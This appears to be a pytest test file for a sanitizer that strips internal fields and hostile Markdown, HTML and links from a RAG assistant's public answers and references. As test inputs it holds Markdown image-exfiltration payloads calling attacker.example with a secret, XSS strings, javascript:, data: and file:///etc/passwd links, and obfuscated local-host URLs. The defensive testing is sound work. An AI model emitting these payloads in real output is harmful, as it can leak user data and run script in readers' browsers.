"""Item 9: the public-view projection (public_view.py). Offline: no network, no DB.

Disclosure rule (owner decision 3, 2026-10-15): an unknown API field is NEVER
displayed; recognised public fields keep rendering; the unknown key NAME (never
the value) is logged server-side. test_every_schema_field_classified fails until
a new API field is reviewed and added to the tables in public_view.py.
"""
import json
import logging
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import public_view as pv  # noqa: E402

HOST = "sentinel-host-do-not-show.example"
SENTINEL_MODEL = f"local-inference@{HOST}:8011:m"
RAW = "RAW-OUTPUT-MARKER"
VAL = "VALIDATION-MARKER"
CLEAN_REF = "Lewis, P. (2020). *Retrieval-augmented generation*. https://doi.org/10.1234/abc"
ANSWER = "RAG combines retrieval with generation (Lewis, 2020)."


def full_response(**over):
    data = {
        "answer": {"answer": ANSWER, "confidence": 0.93, "sources_needed": False, "used_passage_numbers": [1, 2]},
        "tokens_used": 987654, "prompt_tokens": 1000, "completion_tokens": 234,
        "model": SENTINEL_MODEL, "latency_ms": 4321,
        "cost_usd": 0.000777, "input_cost_usd": 0.000333, "output_cost_usd": 0.000444,
        "free_tier_note": f"free tier of {HOST}",
        "attempts": [
            {"attempt": 1, "step": "forced_bad_json", "ok": False, "message": "bad",
             "raw_output": RAW, "validation_error": VAL},
            {"attempt": 2, "step": "structured_output", "ok": True, "message": "ok",
             "raw_output": None, "validation_error": None},
        ],
        "citations": ["docA::3", "docB::1"],
        "references": [
            CLEAN_REF,
            f"Bad, A. (2020). Host leak {HOST}.",
            "Chunk, B. (2020). *Title* docA::3",
            "Http, C. (2020). *Title*. http://example.org/x",
            {"text": "Extra, D.", "url": "https://example.org/p", "extra": ["nested"]},
        ],
        "status": "supported", "embedding_cost_usd": 0.00001, "rag_mode": "auto",
        "skills_used": ["dev-skill-marker"],
    }
    data.update(over)
    return data


def walk(obj):
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield k
            yield from walk(v)
    elif isinstance(obj, (list, tuple)):
        for v in obj:
            yield from walk(v)
    else:
        yield obj


def blob(view) -> str:
    return json.dumps(view.__dict__, default=str)


INTERNAL_MARKERS = [RAW, VAL, "::", SENTINEL_MODEL, HOST, "0.000777", "4321", "987654", "local-inference",
                    "dev-skill-marker", "forced_bad_json", "free tier"]


def test_panel_keys_exactly_allowlist():
    v = pv.public_ask_view(200, full_response(), HOST)
    assert set(v.panel) == {"answer", "status", "rag_mode", "citation_count", "reference_count"}
    e = pv.public_ask_view(503, {"detail": "x"}, HOST)
    assert set(e.panel) == {"http_status", "error"}
    w = pv.public_ask_view(200, {"answer": "not-a-dict"}, HOST)
    assert w.kind == "withheld" and set(w.panel) == {"withheld", "message"}


def test_every_schema_field_classified():
    import main
    from ask_service import Answer
    assert set(main.AskResponse.model_fields) == set(pv.ASK_FIELDS), "classify the new AskResponse field in public_view.py"
    assert set(Answer.model_fields) == set(pv.ANSWER_FIELDS), "classify the new Answer field in public_view.py"
    assert set(main.AttemptResult.model_fields) == set(pv.ATTEMPT_FIELDS), "classify the new AttemptResult field"
    for table in (pv.ASK_FIELDS, pv.ANSWER_FIELDS, pv.ATTEMPT_FIELDS):
        assert set(table.values()) <= {"public", "internal"}


def test_unknown_fields_never_displayed_but_known_still_render(caplog):
    secret = "UNKNOWN-VALUE-MARKER"
    data = full_response(brand_new_field=secret)
    data["answer"]["new_answer_field"] = secret
    data["attempts"][1]["new_attempt_field"] = secret
    with caplog.at_level(logging.WARNING, logger="public_view"):
        v = pv.public_ask_view(200, data, HOST)
    assert v.kind == "answer" and v.answer_text == ANSWER and v.status == "supported"
    assert secret not in blob(v) and "brand_new_field" not in blob(v)
    logged = caplog.text
    assert "brand_new_field" in logged and "new_answer_field" in logged and "new_attempt_field" in logged
    assert secret not in logged


def test_wrong_typed_or_out_of_set_public_fields_fail_closed():
    v = pv.public_ask_view(200, full_response(status="weird", rag_mode="hax"), HOST)
    assert v.kind == "answer" and v.status is None and v.rag_mode is None
    assert v.panel["status"] is None and v.panel["rag_mode"] is None
    assert v.answer_text == ANSWER
    for bad in ({"answer": 5}, {"answer": {"answer": 5}}, {"answer": {"answer": None}}, {"answer": {}}):
        w = pv.public_ask_view(200, full_response(**bad), HOST)
        assert w.kind == "withheld" and w.answer_text == "" and w.references == []
        assert w.message == pv.WITHHELD_MESSAGE
    v = pv.public_ask_view(200, full_response(references="not-a-list", citations="x"), HOST)
    assert v.references == [] and v.citation_count == 0


def test_internal_keys_and_values_never_present():
    v = pv.public_ask_view(200, full_response(), HOST)
    text = blob(v)
    for marker in INTERNAL_MARKERS:
        assert marker not in text, marker
    internal = {k for t in (pv.ASK_FIELDS, pv.ANSWER_FIELDS, pv.ATTEMPT_FIELDS) for k, c in t.items() if c == "internal"}
    leaked = [x for x in walk(v.panel) if isinstance(x, str) and x in internal]
    assert leaked == []


@pytest.mark.parametrize("status,data", [
    (200, {"model": SENTINEL_MODEL}),
    (503, {"detail": f"OpenAI request failed: forced provider 'local-inference@{HOST}:8011' unavailable"}),
    (502, {"detail": f"schema failure {RAW} input_value={RAW} {VAL}"}),
    (500, f"<html>edge page for {HOST}</html>"),
    (0, {"error": f"Could not reach https://{HOST}/ask"}),
    (200, f"plain text {HOST}"),
])
def test_sentinel_host_never_present(status, data):
    v = pv.public_ask_view(status, data, HOST)
    text = blob(v)
    for marker in (HOST, RAW, VAL, "local-inference"):
        assert marker not in text
    if status != 200:  # a 200 stream body IS the answer text; only error bodies are screened
        s = pv.public_stream_view(status, json.dumps(data) if not isinstance(data, str) else data, True, ["a::1"], HOST)
        assert HOST not in json.dumps(s.__dict__)


@pytest.mark.parametrize("code,key", [
    (0, "unreachable"), (400, "bad_request"), (422, "bad_request"), (401, "unavailable"), (402, "unavailable"),
    (403, "unavailable"), (429, "rate_limited"), (500, "provider_failed"), (502, "provider_failed"),
    (503, "provider_failed"), (504, "provider_failed"), (418, "other"), (404, "other"),
])
def test_error_messages_are_fixed(code, key):
    planted = f"PLANTED-DETAIL-MARKER {HOST}"
    v = pv.public_ask_view(code, {"detail": planted, "error": planted}, HOST)
    assert v.kind == "error" and v.message == pv.PUBLIC_ERROR_MESSAGES[key]
    assert "PLANTED" not in blob(v)


def test_reference_token_only_for_exact_format():
    ok = "The AI provider request failed: could not reach the AI provider. Reference: 0123456789ab"
    assert pv.public_ask_view(502, {"detail": ok}).message == pv.PUBLIC_ERROR_MESSAGES["provider_failed"] + " Reference: 0123456789ab"
    for near in (ok + " extra", ok.replace("0123456789ab", "0123456789abc"), ok.replace("0123456789ab", "0123456789AB"),
                 "x " + ok, ok.replace("The AI", "the AI")):
        assert pv.public_ask_view(502, {"detail": near}).message == pv.PUBLIC_ERROR_MESSAGES["provider_failed"]


def test_references_nested_sanitized():
    refs = [
        CLEAN_REF,
        "No link (2020). *Plain title*.",
        "Doi, E. (2020). Title. doi:10.1234/abc.def",
        {"text": "Dict, F. (2020). *Title*.", "url": "https://example.org/p"},
        {"text": "Extra", "url": "https://example.org/p", "other": "x"},         # extra key
        {"text": ["nested"]}, {"text": 5}, ["nested", "list"], 7, None,          # bad shapes
        f"Host, G. (2020). {HOST}",
        "Chunk, H. (2020). docA::3",
        "Local, I. (2020). local-inference",
        "Port, J. (2020). user@box:8011",
        "Ip, K. (2020). 10.0.0.5 and [::1]",
        "Http, L. (2020). http://example.org/x",
        "Userinfo, M. (2020). https://user:pw@example.org/x",
        "Port, N. (2020). https://example.org:8443/x",
        "Ipurl, O. (2020). https://192.168.1.4/x",
        "Js, P. (2020). [click](javascript:alert(1))",
        "Data, Q. (2020). [x](data:text/html;base64,AAAA)",
        "File, R. (2020). file:///etc/passwd",
        "Md, S. (2020). [lic](http://creativecommons.org/x)",
        f"Apihost, T. (2020). https://{HOST}/p",
        {"text": "Bad url", "url": "http://example.org/x"},
    ]
    kept, withheld = pv.public_references(refs, HOST)
    assert kept == [CLEAN_REF, "No link (2020). *Plain title*.", "Doi, E. (2020). Title. doi:10.1234/abc.def",
                    "Dict, F. (2020). *Title*. https://example.org/p"]
    assert withheld == len(refs) - 4
    v = pv.public_ask_view(200, full_response(references=refs), HOST)
    assert v.references == kept and v.reference_count == 4 and v.references_withheld == len(refs) - 4


def test_public_content_preserved():
    v = pv.public_ask_view(200, full_response(), HOST)
    assert v.kind == "answer" and v.answer_text == ANSWER
    assert v.citation_count == 2
    assert v.references == [CLEAN_REF] and v.reference_count == 1
    assert (v.status, v.rag_mode) == ("supported", "auto")
    for st in ("supported", "insufficient", "not_applicable"):
        assert pv.public_ask_view(200, full_response(status=st), HOST).status == st


def test_stream_view():
    s = pv.public_stream_view(200, "streamed answer", True, ["docA::3", "docB::1"], HOST)
    assert s.ok and s.text == "streamed answer" and s.grounded is True and s.citation_count == 2
    assert "::" not in json.dumps(s.__dict__) and not hasattr(s, "served_by") and not hasattr(s, "skills_used")
    e = pv.public_stream_view(503, f'{{"detail": "local-inference@{HOST}:8011 down"}}', None, [], HOST)
    assert not e.ok and e.text == "" and e.message == pv.PUBLIC_ERROR_MESSAGES["provider_failed"]
    assert HOST not in json.dumps(e.__dict__)
    assert pv.public_stream_view(0, "", None, None, HOST).message == pv.PUBLIC_ERROR_MESSAGES["unreachable"]


def test_provider_choices_public_is_auto_only_and_dev_lists_configured():
    entries = [
        {"provider": "groq", "status": "configured"}, {"provider": f"local-inference@{HOST}:8011", "status": "configured"},
        {"provider": "gemini", "status": "unavailable: credential_missing"}, {"provider": "openai", "status": "configured"},
    ]
    assert pv.provider_choices(entries, False) == [pv.AUTO_PROVIDER_LABEL]
    assert pv.provider_choices(None, False) == [pv.AUTO_PROVIDER_LABEL]
    dev = pv.provider_choices(entries, True)
    assert dev[:2] == [pv.AUTO_PROVIDER_LABEL, "openai"] and "groq" in dev and "gemini" not in dev


@pytest.mark.parametrize("ref", [
    "T https://xn--pple-43d.com/a", "T https://\u0430pple.com/a", "T //evil.com/x", "T https://evil.com/\u0000x",
    "T [x]( //evil.com )", "T [x](//evil.com \"t\")", "T [x][1]\n\n[1]: //evil.com", "T [x][1]\n\n[1]: http://evil.com",
    "T https://2130706433/", "T https://0x7f.0.0.1/", "T https://127.1/", "T https://[::1]/",
    "T https://localhost.localdomain/", "T https://localhost/", "T https://10.0.0.1.nip.io/", "T https://a.sslip.io/",
    "T https://10-0-0-1.evil.example/", f"T https://API.EXAMPLE.ONRENDER.COM/x", "T https://api.example.onrender.com./x",
    "T https://api%2eexample.onrender.com/", "T https://sub.api.example.onrender.com/", "T htt\u200bps://evil.com",
    "T ![i](https://tracker.example/p.png)", "T <img src=x onerror=alert(1)>", "T local-inference@192.168.1.5:11434",
    "T Local\u2011Inference", "T https://evil.com:443/", "T https://user@evil.com/", "T jav&#97;script:alert(1)",
    "T 192.168.001.010", "T fe80::1", "T 10.0.0.1:8080", "T *<script>*", "T bell\x07 char", "T cr\rlf",
])
def test_reference_sanitizer_review_probes_dropped(ref):
    kept, withheld = pv.public_references([ref], "api.example.onrender.com")
    assert kept == [] and withheld == 1


def test_reference_sanitizer_still_keeps_clean_entries():
    clean = ["Müller, K. (2020). *Über RAG*. https://doi.org/10.1234/abc", CLEAN_REF,
             "Doe, J. (2021). Title [link](https://example.org/paper \"title\")."]
    assert pv.public_references(clean, "api.example.onrender.com") == (clean, 0)


@pytest.mark.parametrize("url", [
    "https://0177.0.0.1/", "https://0x7f000001/", "https://017700000001/", "https://127.0.0.1.nip.io/",
    "https://7f000001.sslip.io/", "https://a.b.localtest.me/", "https://[fe80::1%25eth0]/", "https://[::ffff:127.0.0.1]/",
    "https://api%2eexample.onrender.com/", "https://%31%32%37.0.0.1/", "https://\u2460\u2467.0.0.1/",
    "https://xn--80ak6aa92e.com/", "https://m\u00fcller.de/", "https://evil.com\\@good.com/", "https://evil.com@10.0.0.1/",
    "https://1.2.3.4.xip.io/", "https://foo.localhost/", "https://printer.lan/", "https://host.internal/",
])
def test_host_representation_probe_classes_dropped(url):
    kept, withheld = pv.public_references([f"Author, A. (2020). *Title*. {url}", {"text": "T", "url": url}], "api.example.onrender.com")
    assert kept == [] and withheld == 2


@pytest.mark.parametrize("ref", [
    "Evil. (2020). T.\n\nwww.10.0.0.1.nip.io/x", "T www.corp.internal", "T.\n\nwww.xn--80ak6aa92e.com", "T www.0x7f000001.com",
    "T www.nip.io", "T www.localhost", "T user@corp.internal", "T see a.b@example.org", "T www.127.0.0.1/x",
])
def test_autolink_candidates_dropped(ref):
    assert pv.public_references([ref], "api.example.onrender.com") == ([], 1)


def test_whitespace_collapsed_and_apa_titles_kept():
    kept, withheld = pv.public_references(
        ["Lee, K. (2020).\n\n*Title*.   Press.\tSee www.example.org/paper and https://doi.org/10.1000/xyz",
         {"text": "Doe, J. (2021). Title: subtitle.", "url": "https://www.example.org/paper"},
         "M\u00fcller, K. (2018). \u00dcber Lernen. *Zeitschrift*, 3, 5\u20139."], "api.example.onrender.com")
    assert withheld == 0 and all("\n" not in k and "  " not in k for k in kept)
    assert kept[0] == "Lee, K. (2020). *Title*. Press. See www.example.org/paper and https://doi.org/10.1000/xyz"


# ---- SF10: answer / streamed answer Markdown ---------------------------------
H = "api.example.onrender.com"
ATTACK = "https://attacker.example/?q=SECRET"


def md(t):
    return pv.public_answer_markdown(t, H)


@pytest.mark.parametrize("payload", [
    f"![](${ATTACK})".replace("$", ""), f"![alt]({ATTACK})", f'![alt]({ATTACK} "title")', f"![alt](<{ATTACK}>)",
    f"![alt][id]\n\n[id]: {ATTACK}", f"![alt][]\n\n[alt]: {ATTACK}", f"![alt]\n\n[alt]: {ATTACK}",
    f"! [alt]({ATTACK})", f"!​[alt]({ATTACK})", f"!⁠[alt]({ATTACK})", f"！［alt］（{ATTACK}）",
    f"![a](https://attacker.example/x_(1)?q=SECRET)", f"![a ![b](x)](https://attacker.example/q=SECRET)",
])
def test_image_injection_variants_removed(payload):
    out = md("Before " + payload + " after")
    assert "attacker.example" not in out and "SECRET" not in out and "![" not in out
    assert out.startswith("Before ") and out.endswith(" after") or "Before" in out


@pytest.mark.parametrize("payload", [
    '<img src="https://attacker.example/x">', "<IMG SRC=x onerror=alert(1)>", "<svg onload=alert(1)></svg>",
    '<iframe src="https://attacker.example"></iframe>', '<a href="https://attacker.example">click</a>',
    "<!-- https://attacker.example -->", "<!DOCTYPE html>", "<?php echo 1 ?>", "<script>alert(1)</script>",
    "&lt;img src=https://attacker.example/x&gt;", "&#x3C;img src=x&#x3E;", "&#60;img src=x&#62;", "&amp;lt;img src=x&amp;gt;",
    "＜img src=x＞", "<im​g src=x>", "<img src=x",
])
def test_raw_html_and_encoded_variants_removed(payload):
    out = md("A " + payload + " B")
    assert "<img" not in out.lower() and "<svg" not in out.lower() and "<script" not in out.lower() and "<iframe" not in out.lower()
    assert "<a " not in out.lower() and "<!--" not in out and "attacker.example" not in out.replace("\\", "") or "attacker" not in out
    assert "onerror" not in out.lower() or "<" not in out


def test_unsafe_link_keeps_text_loses_target_and_safe_links_kept():
    assert md("[click](javascript:alert(1))") == "click"
    assert md("[click](http://evil.example/x)") == "click"
    assert md("[click](https://10.0.0.1/x)") == "click"
    assert md("[click](https://ex%61mple.com/x)") == "click"
    assert md("[click](https://good.org/a%0Ab)") == "click"
    assert md("[click](//evil.example)") == "click"
    for safe in ("[paper](https://example.org/paper)", "[doi](https://doi.org/10.1000/xyz)",
                 '[paper](https://example.org/paper "T")', "<https://example.org/paper>"):
        assert md(safe) == safe


def test_bare_autolink_candidates_neutralised():
    for bad in ("www.10.0.0.1.nip.io/x", "www.corp.internal", "www.0x7f000001.com", "www.xn--80ak6aa92e.com",
                "user@corp.internal", "http://evil.example/x", "ftp://evil.example/x", "https://127.0.0.1/x",
                "https://x.nip.io/"):
        out = md(f"See {bad} now")
        assert out != f"See {bad} now" and "\\" in out, bad
        assert bad not in out
    assert md("See https://example.org/paper now") == "See https://example.org/paper now"
    assert md("See www.example.org/paper now") == "See www.example.org/paper now"


def test_blank_line_www_email_reviewer_cases_in_answer():
    out = md("Text.\n\nwww.10.0.0.1.nip.io/x\n\nuser@corp.internal")
    assert "www.10.0.0.1" not in out and "user@corp" not in out


def test_fixed_point_cannot_reassemble_image():
    out = md("!<b>[x](https://attacker.example/SECRET)</b>")
    assert "attacker.example" not in out and "![" not in out
    out = md("!<!-- c -->[x](https://attacker.example/SECRET)")
    assert "attacker.example" not in out and "![" not in out
    out = md("!&#8203;[x](https://attacker.example/SECRET)")
    assert "attacker.example" not in out and "![" not in out


def test_ordinary_markdown_survives():
    text = ("# Heading\n\n## Sub\n\n- item one\n- item **bold** and *italic* and `code`\n\n1. first\n2. second\n\n"
            "```python\nprint('hi')\n```\n\nRAG is useful (Lewis et al., 2020) [1]. See [paper](https://example.org/p) "
            "and [doi](https://doi.org/10.1000/xyz). 5 < 6 and A & B.")
    assert md(text) == text


def test_stream_view_sanitises_text_including_chunk_split_attack():
    chunks = ["Answer ! ", "[x](https://attacker.example/", "SECRET) and <im", "g src=x> end"]
    s = pv.public_stream_view(200, "".join(chunks), True, [], H)
    assert s.ok and "attacker.example" not in s.text and "<img" not in s.text and "![" not in s.text
    ok = pv.public_stream_view(200, "# Title\n\n- a\n- [p](https://example.org/p)", None, None, H)
    assert ok.text == "# Title\n\n- a\n- [p](https://example.org/p)"


def test_ask_view_answer_and_panel_sanitised():
    v = pv.public_ask_view(200, full_response(answer={"answer": f"Hi ![x]({ATTACK}) <img src=x> done"}), H)
    assert "attacker.example" not in blob(v) and "<img" not in blob(v)


# ---- re-probe fixes: ReDoS bound and the CommonMark verification pass ----------
import time  # noqa: E402

DOS_INPUTS = {
    "x.": "x." * 50000, "www.": "www." * 30000, "a<": "a<" * 50000, "a": "a" * 50000, "a@": "a@" * 30000,
    "[](": "[](" * 20000, "a@b.": "a@b." * 25000, "![a](": "![a](" * 10000, "<a": "<a" * 50000,
    "&amp;": "&amp;" * 20000, "(": "(" * 50000, "[x](": "[x](" * 10000, "http://": "http://" * 10000,
}


@pytest.mark.parametrize("name", list(DOS_INPUTS))
def test_pathological_answers_finish_under_one_second_and_are_capped(name):
    t = time.time()
    out = pv.public_answer_markdown(DOS_INPUTS[name], H)
    assert time.time() - t < 1.0, name
    assert out.endswith(pv.TRUNCATION_NOTICE)
    t = time.time()
    s = pv.public_stream_view(200, DOS_INPUTS[name], None, None, H)
    assert time.time() - t < 1.0 and s.text.endswith(pv.TRUNCATION_NOTICE)


def test_answer_sanitised_once_per_response(monkeypatch):
    calls = []
    real = pv.public_answer_markdown
    monkeypatch.setattr(pv, "public_answer_markdown", lambda t, h=None: calls.append(1) or real(t, h))
    pv.public_ask_view(200, full_response(), H)
    assert len(calls) == 1


def test_oversized_reference_dropped_fast():
    t = time.time()
    kept, withheld = pv.public_references(["a." * 50000, {"text": "x", "url": "https://e.org/" + "a" * 50000}, "www." * 30000], H)
    assert kept == [] and withheld == 3 and time.time() - t < 1.0


UNSAFE_LINK_FORMS = [
    "[x](javascript:a((b)))", "[x](javascript:a (t))", "[x](vbscript:a\\(b)", "[x\\]](javascript:a)",
    "> [x]: javascript:a\n\n[x]", "- [x]: javascript:a\n\n[x]", "[x](http://10.0.0.1/((a)))", "[x](http://10.0.0.1/a\\(b)",
    "[x](http://10.0.0.1 (title))", "[`]`](http://10.0.0.1)", "[x](http://10.0.0.1/a\\))", "[x]\n\n[x]: http://10.0.0.1 (title)",
    "[x](ftp://10.0.0.1)", "<ftp://10.0.0.1>",
]


def _commonmark_problems(out):
    from markdown_it import MarkdownIt
    from urllib.parse import unquote
    probs = []

    def walk(ts):
        for t in ts:
            if t.type in ("image", "html_inline", "html_block"):
                probs.append(t.type)
            if t.type == "link_open":
                href = t.attrs.get("href", "")
                if not (pv._url_ok(href, H) and pv._url_ok(unquote(href), H)):
                    probs.append(href)
            if t.children:
                walk(t.children)
    walk(MarkdownIt("commonmark").enable(["table", "strikethrough"]).parse(out))
    return probs


@pytest.mark.parametrize("payload", UNSAFE_LINK_FORMS)
def test_unsafe_link_forms_never_leave_a_unsafe_link(payload):
    out = md("Before " + payload)
    assert _commonmark_problems(out) == [], out
    assert "10.0.0.1" not in out.replace("\\", "") or "\\" in out


@pytest.mark.parametrize("payload", UNSAFE_LINK_FORMS + ["![a](https://e.org/i.png)", "<img src=x>"])
def test_regex_fallback_when_markdown_it_missing(payload, monkeypatch):
    monkeypatch.setitem(sys.modules, "markdown_it", None)  # `import markdown_it` raises ImportError
    out = md("Before " + payload)
    assert "<img" not in out and "![" not in out
    import re
    for m in re.finditer(r"(?<!\\)\]\(\s*<?([^)\s>]*)", out):
        assert pv._target_ok(m.group(1), H), out
    assert not re.search(r"(?<!\\)\]:\s*(?:javascript|vbscript|http:)", out), out


def test_must_keep_markdown_incl_tables_and_citations_unchanged():
    text = ("# Heading\n\n- item **bold** *em*\n- [paper](https://example.org/p)\n\n1. one\n2. [doi](https://doi.org/10.1000/xyz)\n\n"
            "| a | b |\n|---|---|\n| 1 | [p](https://example.org/p) |\n\nRAG works (Lewis et al., 2020) [1].")
    assert md(text) == text


def test_verification_failure_falls_back_to_escaped_words():
    out = pv._escape_plain("Hello [x](javascript:a) world")
    assert "Hello" in out and "world" in out and "\\[" in out
    assert _commonmark_problems(out) == []


# ---- final re-probe fixes ----------------------------------------------------
VALIDATE_LINK_FORMS = [
    "[x](javascript:a((b)))", "[x](javascript:a (t))", "[x](vbscript:a\\(b)", "[x\\]](javascript:a)", "[`]`](javascript:a)",
    "> [x]: javascript:a\n\n[x]", "- [x]: data:text/html,hi\n\n[x]", "[x](javascript&#58;a)", "[x](file:///etc/passwd (t))",
]


@pytest.mark.parametrize("payload", VALIDATE_LINK_FORMS)
def test_hidden_scheme_links_reach_the_check_and_fall_back_to_escaped_text(payload):
    from markdown_it import MarkdownIt
    md_all = MarkdownIt("commonmark").enable(["table", "strikethrough"])
    md_all.validateLink = lambda u: True
    out = md("Before " + payload)

    def hrefs(ts):
        for t in ts:
            if t.type in ("link_open", "image"):
                yield t.attrs.get("href") or t.attrs.get("src")
            if t.children:
                yield from hrefs(t.children)
    assert [h for h in hrefs(md_all.parse(out)) if not pv._url_ok(h, H)] == [], out
    assert pv._markdown_unsafe("[x](javascript:a)", H) is True  # verification pass sees what the default validator hides


@pytest.mark.parametrize("bad", ["ans \ud83d", "\ude00 lone", "x\ud800y\udfffz"])
def test_lone_surrogates_dropped_everywhere(bad):
    assert md(bad).encode("utf-8")
    v = pv.public_ask_view(200, full_response(answer={"answer": bad}), H)
    s = pv.public_stream_view(200, bad, None, None, H)
    for out in (v.answer_text, v.panel["answer"], s.text):
        out.encode("utf-8")
        assert not any(0xD800 <= ord(c) <= 0xDFFF for c in out)
    kept, withheld = pv.public_references([f"Lee, K. (2020). Title {bad}", {"text": bad}], H)
    assert kept == [] and withheld == 2
    json.dumps(v.panel).encode("utf-8")


def test_broken_url_escape_does_not_stack_and_safe_outer_url_is_kept():
    once = md("see http://10.0.0.1/x now")
    assert once == "see http\\://10.0.0.1/x now" and md(once) == once
    assert md("a ftp://evil.example/x b") == "a ftp\\://evil.example/x b"
    outer = md("https://good.org/?u=http://10.0.0.1 end")
    assert outer == "https://good.org/?u=http%3A//10.0.0.1 end" and md(outer) == outer
    assert pv._url_ok(outer.split()[0], H)
    assert md("https://good.org/ok") == "https://good.org/ok"
